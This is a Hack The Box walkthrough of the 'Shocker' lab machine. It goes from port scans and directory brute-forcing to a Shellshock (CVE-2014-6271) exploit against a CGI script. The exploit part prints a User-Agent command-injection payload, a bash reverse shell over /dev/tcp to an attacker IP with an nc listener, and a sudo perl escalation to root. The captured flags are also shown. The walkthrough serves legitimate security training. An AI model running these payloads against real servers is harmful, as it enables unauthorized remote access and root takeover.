---
icon: desktop
---

# Shocker



```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.56 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 20:27 CET
Initiating SYN Stealth Scan at 20:27
Scanning 10.10.10.56 [65535 ports]
Discovered open port 80/tcp on 10.10.10.56
Discovered open port 2222/tcp on 10.10.10.56
Completed SYN Stealth Scan at 20:27, 29.33s elapsed (65535 total ports)
Nmap scan report for 10.10.10.56
Host is up, received user-set (0.54s latency).
Scanned at 2025-02-13 20:27:07 CET for 29s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 63
2222/tcp open  EtherNetIP-1 syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
           Raw packets sent: 71016 (3.125MB) | Rcvd: 70953 (2.839MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.56
	[*] Open ports: 80,2222

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p80,2222 10.10.10.56 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 20:29 CET
Nmap scan report for 10.10.10.56
Host is up (0.075s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   91.64 ms 10.10.16.1
2   48.89 ms 10.10.10.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.62 seconds
```





```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```





<figure><img src="../../.gitbook/assets/4929_vmware_S0bllxIv6F.png" alt=""><figcaption></figcaption></figure>



```bash
❯ whatweb http://10.10.10.56
http://10.10.10.56 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.56]
```



<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>



```bash
❯ dirsearch -u 'http://10.10.10.56/' -t 50 -i 200 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Shocker/Shocker/reports/http_10.10.10.56/__25-02-14_15-49-09.txt

Target: http://10.10.10.56/

[15:49:09] Starting: 

Task Completed
```





```bash
❯ cat targeted -l java
# Nmap 7.95 scan initiated Thu Feb 13 20:29:10 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p80,2222 -A -oN targeted -oX targetedXML 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.075s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```





```bash
❯ feroxbuster -u http://10.10.10.56 -x html,php
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.56
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      234l      773w    66161c http://10.10.10.56/bug.jpg
200      GET        9l       13w      137c http://10.10.10.56/
200      GET        9l       13w      137c http://10.10.10.56/index.html
```



```bash
❯ feroxbuster -u http://10.10.10.56 -f -n --status-codes 200,403 --dont-filter
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.56
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🤪  Filter Wildcards      │ false
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w      294c http://10.10.10.56/cgi-bin/
200      GET      234l      773w    66161c http://10.10.10.56/bug.jpg
200      GET        9l       13w      137c http://10.10.10.56/
403      GET       11l       32w      292c http://10.10.10.56/icons/
403      GET       11l       32w      300c http://10.10.10.56/server-status/
```





```bash
❯ feroxbuster -u http://10.10.10.56/cgi-bin/ -x sh,cgi,pl,txt,php
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.56/cgi-bin/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [sh, cgi, pl, txt, php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        7l       17w      118c http://10.10.10.56/cgi-bin/user.sh
404      GET        9l       33w      299c http://10.10.10.56/cgi-bin/Style%20Library.sh
```



<figure><img src="../../.gitbook/assets/imagen (349).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://github.com/b4keSn4ke/CVE-2014-6271/" %}



```bash
User-Agent: () { :; }; echo; /usr/bin/id
```

<figure><img src="../../.gitbook/assets/4933_vmware_DKMYqW3eGe.png" alt=""><figcaption></figcaption></figure>





```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```



```bash
User-Agent: () { :; }; /bin/bash -c /bin/bash -i >& /dev/tcp/10.10.16.7/443 0>&1
```

<figure><img src="../../.gitbook/assets/4934_vmware_ERbzQkZKr1.png" alt=""><figcaption></figcaption></figure>



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.56] 42186
script /dev/null -c bash
Script started, file is /dev/null
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt 
2283b57fd1d301901247600722f55fbd
```



```bash
shelly@Shocker:/usr/lib/cgi-bin$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```





{% embed url="https://gtfobins.github.io/gtfobins/perl/#sudo" %}

{% embed url="https://github.com/r1vs3c/searchbins" %}

```bash
❯ searchbins -b perl -f sudo

[+] Binary: perl

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/perl/#sudo]

	| sudo perl -e 'exec "/bin/sh";'
```





```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash";'  
root@Shocker:/usr/lib/cgi-bin# cat /root/root.txt 
47fd73a7751770c8a757132aebe0ba0d
```
